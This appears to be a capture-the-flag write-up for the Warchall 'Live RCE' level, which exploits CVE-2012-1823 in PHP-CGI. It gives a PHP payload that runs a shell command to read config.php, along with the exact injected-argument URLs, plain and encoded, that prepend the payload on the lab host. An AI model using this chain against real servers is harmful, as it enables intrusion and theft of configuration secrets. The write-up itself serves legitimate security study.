## Level 20 - Warchall: Live RCE (Remote Code Execution)

This challenge involves exploiting a specific vulnerability, namely CVE-2012-1823 (PHP-CGI Remote Code Execution).

### Vulnerability Overview

The vulnerability allows an attacker to execute arbitrary code through PHP-CGI by manipulating the parameters passed to it. Specifically, appending parameters like `?-s` to the URL simulates PHP-CGI parameters such as `/usr/bin/php53-cgi/php-cgi -f index.php -s`.

### Initial Analysis

-  Explore the PHP-CGI options using `php-cgi --help`.
-  Recognize that the target script (`index.php`) includes another file (`config.php`) using the statement `require '../config.php';`.
-  Identify the absolute paths of the files: `/home/level/20_live_rce/www/index.php` and `/home/level/20_live_rce/config.php`.

### Exploitation Steps
-  Use PHP-CGI parameters to define INI entries:
    
    -   `-dallow_url_include=On`: Allows including remote files.
    -   `-dauto_prepend_file=/tmp/2.php`: Specifies a file to include before processing the requested file.
-  Create `/tmp/2.php` with the following content:
```php
<?php
exec("cat /home/level/20_live_rce/config.php", $out);
print_r($out);
?>
```
- Access the target script with the manipulated parameters:
>http://rce.warchall.net/?-dallow_url_include=On+-dauto_prepend_file=/tmp/2.php+-n
- Access the target script with the manipulated parameters and encoded url:
>http://rce.warchall.net/?-dallow_url_include%3DOn+-dauto_prepend_file%3D%2ftmp%2f2.php+-n
